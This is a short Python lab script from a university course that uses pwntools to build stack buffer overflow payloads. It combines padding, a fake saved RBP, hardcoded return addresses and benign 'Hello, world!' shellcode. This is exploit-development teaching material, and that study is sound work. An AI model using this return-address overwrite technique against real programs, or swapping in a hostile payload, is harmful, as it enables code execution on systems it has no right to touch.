#!/usr/bin/env python3
# Simple Python script to generate shellcode for Lab5
# Nils, SUTD, 2016

from pwn import *

# lenfill was determined using pattern and finding the offset for the rip, -8
# for rbp length which is inserted in this script
lenfill = 72-8 # or some other value

# Hello World! payload - designed by Oka, 2014
payload = b'\xeb\x2a\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x5e\xba\x0e\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05\xe8\xd1\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21'

storedRBP = p64(0x4444444444444444)  # DDDDDDDD in hex

# When running inside GDB
# address found by examing stack
storedRIPgdb = p64(0x7fffffffe3e0)  # address of payload in hex

# When running in shell - 
# address found by examining info frame and stack
storedRIPshell = p64(0x7fffffffe460)  # address of payload for shell


with open('payloadgdb2', 'wb') as f:
    f.write(b'A' * lenfill + storedRBP + storedRIPgdb + payload +b'\n')

with open('payloadgdb2shell', 'wb') as f:
    f.write(b'A' * lenfill + storedRBP + storedRIPshell+ payload + b'\n')
